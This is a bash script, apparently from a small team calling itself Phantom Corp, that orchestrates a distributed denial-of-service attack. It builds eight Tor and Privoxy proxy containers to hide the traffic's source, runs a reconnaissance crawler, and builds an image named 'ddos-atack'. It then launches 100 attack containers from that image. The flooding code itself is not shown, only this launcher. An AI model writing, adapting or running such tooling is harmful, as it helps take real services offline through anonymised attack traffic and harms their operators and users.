#!/bin/bash

#-----------------------------
#       Created by: 
#        João Carlos, Lukas Sousa, Nicolas Gomes
#
#       Phantom Corp
#
#-----------------------------


IMAGE_NAME="ddos-atack"

#-----------------------------
#       Terminal colors
#-----------------------------
BLUE="\e[00;34m"
GREEN="\e[00;32m"
BOLD_YELLOW="\e[01;33m"
CYAN="\e[0;31m"
END="\e[00m"

#-----------------------------
#       Creating images
#-----------------------------
proxy_config(){
    echo -e "\n\n$GREEN [+] Start building proxy image...$END\n\n\n"
    docker build -t privoxy -f ./privoxy/Dockerfile.TOR .

    sleep 1
    echo -e "\n\n$GREEN [+] Starting proxy containers...$END\n\n\n"
    
    for i in $(seq 1 8)
    do
        docker run -d --name privoxy_$i -p $((8118+$i)):8118 -p $((9050+$i)):9050 privoxy
        sleep 1
    done
}

execute_crawler(){
    echo "n\n\n$GREEN [+] Start recon fase...$END\n\n\n"

    python crawler.py
    sleep 4
}

app_config(){
    echo "n\n\n$GREEN [+] Start build app image...$END\n\n\n"
    docker build -t ddos-atack -f ./Dockerfile.app .

    sleep 1
}

#-------------------------------------
#   Creating containers and atacking
#-------------------------------------
generate_attack(){
    for i in $(seq 1 100)
    do
        docker run -d --name "app_attack_$i" $IMAGE_NAME
        echo "n\n\n$GREEN [+] Create container app_attack_$i...$END\n\n\n"
    done

    echo "Todos os 100 containers foram criados."
}

main(){
    proxy_config
    execute_crawler
    app_config
    generate_attack
}

main